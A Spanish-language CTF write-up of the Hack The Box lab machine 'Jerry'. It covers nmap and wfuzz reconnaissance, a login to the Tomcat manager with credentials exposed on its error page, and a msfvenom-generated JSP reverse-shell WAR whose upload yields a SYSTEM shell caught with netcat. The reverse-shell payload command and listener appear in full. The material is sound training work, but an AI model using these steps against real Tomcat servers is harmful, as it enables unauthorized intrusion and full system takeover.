---
layout: single
title: Jerry - Hack The Box
excerpt: "Esta es una máquina bastante sencilla, realizada en Windows y en la cual vamos a usar el servicio Tomcat para poder hackearla, usando un Payload en lugar de un Exploit para crear una Backdoor en la máquina para que nos devuelva una Shell."
date: 2023-01-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-jerry/jerry_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - Tomcat
  - Malicious Payload
  - Abusing File Upload
  - Reverse Shell
  - OSCP Style
---
![](/assets/images/htb-writeup-jerry/jerry_logo.png)
Esta es una máquina bastante sencilla, realizada en **Windows** y en la cual vamos a usar el **servicio Tomcat** para poder hackearla, usando un **Payload** en lugar de un Exploit, para crear una **Backdoor** en la máquina para que nos devuelva una **Shell**.

Herramientas utilizadas:
* *nmap*
* *whatweb*
* *wfuzz*
* *msfvenom*
* *rlwrap*


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Invest">Investigación del Servicio</a></li>
				<li><a href="#Fuzz">Aplicando Fuzzing</a></li>
				<li><a href="#Web">Analizando Página Web</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#BuscandoPay">Buscando y Configurando un Payload</a></li>
				<li><a href="Exploit">Accediendo a la Máquina</a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

```bash
ping -c 4 10.10.10.95
PING 10.10.10.95 (10.10.10.95) 56(84) bytes of data.
64 bytes from 10.10.10.95: icmp_seq=1 ttl=127 time=134 ms
64 bytes from 10.10.10.95: icmp_seq=2 ttl=127 time=137 ms
64 bytes from 10.10.10.95: icmp_seq=3 ttl=127 time=134 ms
64 bytes from 10.10.10.95: icmp_seq=4 ttl=127 time=133 ms

--- 10.10.10.95 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 132.645/134.479/137.492/1.823 ms
```
Observamos que la máquina está conectada, además vemos el TTL y vemos que es una máquina Windows.

<h2 id="Puertos">Escaneo de Puertos</h2>

Realizamos un escaneo de puertos para ver cuales están abiertos, una vez realizado haremos un escaneo de servicios. Vemos solamente un puerto abierto, que es el 8080, investigando un poco vemos que este puerto es usado para la web pero es necesario activar un proxy.
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 12:30 CST
Initiating SYN Stealth Scan at 12:30
Scanning 10.10.10.95 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.95
Increasing send delay for 10.10.10.95 from 0 to 5 due to 11 out of 14 dropped probes since last increase.
Completed SYN Stealth Scan at 12:30, 31.38s elapsed (65535 total ports)
Nmap scan report for 10.10.10.95
Host is up, received user-set (0.60s latency).
Scanned at 2023-01-15 12:30:17 CST for 31s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
           Raw packets sent: 131090 (5.768MB) | Rcvd: 14 (608B)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

<h2 id="Servicios">Escaneo de Servicios</h2>

Una vez encontrados los puertos, analizamos los servicios que operan en estos. En este caso solo se encontró 1 abierto, así que vamos a analizarlo:
```bash
nmap -sC -sV -p8080 10.10.10.95 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-15 12:36 CST
Nmap scan report for 10.10.10.95
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Vemos que el servicio que opera es el **Tomcat**, además de ver que es una página web podemos analizarla también con la herramienta **"whatweb"** siendo que nos dará el mismo resultado pero con un poco más de información. OJO, en este caso hay que indicarle el puerto, esto se hace porque el puerto está ocupando proxy, si no fuera ese caso, solo se pondría la IP de la máquina y listo:
```shell
whatweb http://10.10.10.95:8080/
http://10.10.10.95:8080/ [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]
```

<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Inves">Investigación del Servicio</h2>

Bueno, pero ¿qué chuchas es el servicio Tomcat? pues vamos a investigarlo:

| **Tomcat** |
|:-----------:|
| *Apache Tomcat (o, sencillamente, Tomcat) es un contenedor de servlets que se puede usar para compilar y ejecutar aplicaciones web realizadas en Java. Implementa y da soporte tanto a servlets como a páginas JSP (Java Server Pages) o Java Sockets.* |

<br>

Entonces entendemos que usa **Java** para trabajar la aplicación web, podemos usar esto para encontrar el Exploit/payload indicado y acceder a la máquina. Pero antes vamos a analizar la página web.

<h2 id="Fuzz">Aplicando Fuzzing</h2>

Vamos a analizar que directorios contiene la página web, para esto, utilizaremos la herramienta **wfuzz**:

```bash
wfuzz -c --hc=404,400 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.95:8080/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.95:8080/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000001:   200        201 L    495 W      11398 Ch    "# directory-list-2.3-medium.txt"                                                                                                                                         
000000007:   200        201 L    495 W      11398 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                                                         
000000003:   200        201 L    495 W      11398 Ch    "# Copyright 2007 James Fisher"                                                                                                                                           
000000014:   200        201 L    495 W      11398 Ch    "http://10.10.10.95:8080//"                                                                                                                                               
000000011:   200        201 L    495 W      11398 Ch    "# Priority ordered case sensative list, where entries were found"                                                                                                        
000000012:   200        201 L    495 W      11398 Ch    "# on atleast 2 different hosts"                                                                                                                                          
000000013:   200        201 L    495 W      11398 Ch    "#"                                                                                                                                                                       
000000010:   200        201 L    495 W      11398 Ch    "#"                                                                                                                                                                       
000000008:   200        201 L    495 W      11398 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                                                                                                              
000000005:   200        201 L    495 W      11398 Ch    "# This work is licensed under the Creative Commons"                                                                                                                      
000000006:   200        201 L    495 W      11398 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                                                           
000000002:   200        201 L    495 W      11398 Ch    "#"                                                                                                                                                                       
000000009:   200        201 L    495 W      11398 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                                                                                                     
000000004:   200        201 L    495 W      11398 Ch    "#"                                                                                                                                                                       
000000090:   200        282 L    1494 W     19677 Ch    "docs"                                                                                                                                                                    
000000902:   200        32 L     152 W      1285 Ch     "examples"                                                                                                                                                                
000004889:   302        0 L      0 W        0 Ch        "manager"                                                                                                                                                                 
000045240:   200        201 L    495 W      11398 Ch    "http://10.10.10.95:8080//"                                                                                                                                               
000047456:   200        0 L      0 W        0 Ch        "aux"                                                                                                                                                                     

Total time: 0
Processed Requests: 220560
Filtered Requests: 220541
Requests/sec.: 0
```

| Parámetros | Descripción |
|--------------------------|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Nos muestra 3 directorios, el que nos puede resultar más útil es el de **manager**, porque desde ahí podemos configurar y ver más información sobre la máquina y el servicio activo. Primero, vamos a entrar a la página por default.

<h2 id="Web">Analizando Página Web</h2>

Una vez entramos usando la IP, vemos que nos manda a una página por default del **servicio Tomcat**:

![](/assets/images/htb-writeup-jerry/Captura1.png)

La idea es que podamos acceder al directorio **manager** para obtener más información, podemos observar que hay 3 botones, entre ellos uno llamado **manager**, que cada vez que intentamos acceder nos pide un usuario y contraseña, no tenemos contraseñas así que vamos a investigar las contraseñas por defecto para entrar, pero de una vez te digo que no van a funcionar.

Al equivocarnos por meter el usuario y contraseña incorrectos, nos redirigira a una página web que nos menciona que no estamos autorizados para entrar, sin embargo, podemos ver que ahí viene un usuario y contraseña, siempre hay que probar de todo, así que vamos a utilizar estas credenciales para acceder.

![](/assets/images/htb-writeup-jerry/Captura2.png)

![](/assets/images/htb-writeup-jerry/Captura3.png)

Listo, hemos podido entrar.

Analizando un poco la página, ya como administrador vemos que podemos subir archivos tipo **.war** por lo que, podemos usar esto para buscar un payload malicioso que podamos usar, pues lo que podemos subir es una **Reverse Shell** y con eso obtenemos una **Shell** conectada, osease que lo que estamos haciendo es una **BackDoor**.

<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="BuscandoPay">Buscando y Configurando un Payload</h2>

Si bien antes usamos **Searchsploit** para buscar Exploits en la base de datos de Metasploit para usarlos, esta vez vamos a usar la herramienta **msfvenom** que nos ayuda a crear payloads maliciosos que podemos usar en cualquier lado, aquí le podemos indicar los mismos parámetros que en un Exploit del **Metasploit Framework** como el puerto y la IP de nosotros o de la víctima.

Ahora para buscar los Payloads debemos usar el siguiente comando, especificando que buscamos los tipos **Java**:
```bash
msfvenom -l payloads | grep java
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
    java/meterpreter/bind_tcp                                          Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                                      Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                                     Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                                       Run a meterpreter server in Java. Connect back stager
    java/shell/bind_tcp                                                Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
    java/shell/reverse_tcp                                             Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
    java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shel
```
Vamos a ocupar este Payload: **java/jsp_shell_reverse_tcp** que como su descripción nos dice, se va a conectar de la máquina victima hacia nosotros spawneando una Shell. Para usar el Exploit solamente debemos indicarle 3 cosillas:
* Nuestra IP con LHOST
* Un puerto con RHOST
* Que se guarde en archivo tipo war con -f war

Y ya solamente lo podemos guardar con un nombre en específico, yo lo llame **shell.war**:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f war -o shell.war
Payload size: 1096 bytes
Final size of war file: 1096 bytes
Saved as: shell.war
```
Con esto ya nos creó un archivo .war que es lo que admite la aplicación web, ahora debemos subirlo con la opción browser:

![](/assets/images/htb-writeup-jerry/Captura4.png)

Lo seleccionamos y ya lo subimos, ahí mismo observamos que el archivo es tipo **.war**.

![](/assets/images/htb-writeup-jerry/Captura5.png)

<h2 id="Exploit">Accediendo a la Máquina</h2>

Una vez subido el archivo que creamos con el Payload, que es una **Reverse Shell**, ya solamente debemos alzar una netcat y activar el Payload:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```
Le damos click al archivo **.war**:

<br>
<p align="center">
<img src="/assets/images/htb-writeup-jerry/Captura6.png">
</p>

¡Y listo! Ya estamos dentro, directamente somos Root:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...

connect to [10.10.14.10] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
C:\apache-tomcat-7.0.88>whoami
nt authority\system
```
Y ya solamente es buscar las flags, que normalmente siempre están alojadas en la carpeta usuarios, dentro del escritorio del usuario y del administrados:
```bash
:\apache-tomcat-7.0.88>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\

06/19/2018  03:07 AM    <DIR>          apache-tomcat-7.0.88
08/22/2013  05:52 PM    <DIR>          PerfLogs
06/19/2018  05:42 PM    <DIR>          Program Files
06/19/2018  05:42 PM    <DIR>          Program Files (x86)
06/18/2018  10:31 PM    <DIR>          Users
01/21/2022  08:53 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   2,418,688,000 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users

06/18/2018  10:31 PM    <DIR>          .
06/18/2018  10:31 PM    <DIR>          ..
06/18/2018  10:31 PM    <DIR>          Administrator
08/22/2013  05:39 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   2,418,688,000 bytes free

C:\Users>cd Administrator
cd Administrator

Directory of C:\Users\Administrator\Desktop

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,418,688,000 bytes free
```
Una vez en el usuario administrador, vemos que hay un directorio que dice flags y ahí estará lo que buscamos:

```bash
C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
```

De esta forma, no es necesario ya escalar privilegios, pues ya somos administradores y tampoco es necesario usar **Metasploit Framework**, porque sería complicarnos un poco la vida y eso no es lo que buscamos.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* https://tomcat.apache.org/tomcat-7.0-doc/html-manager-howto.html
* https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

<br>
# FIN
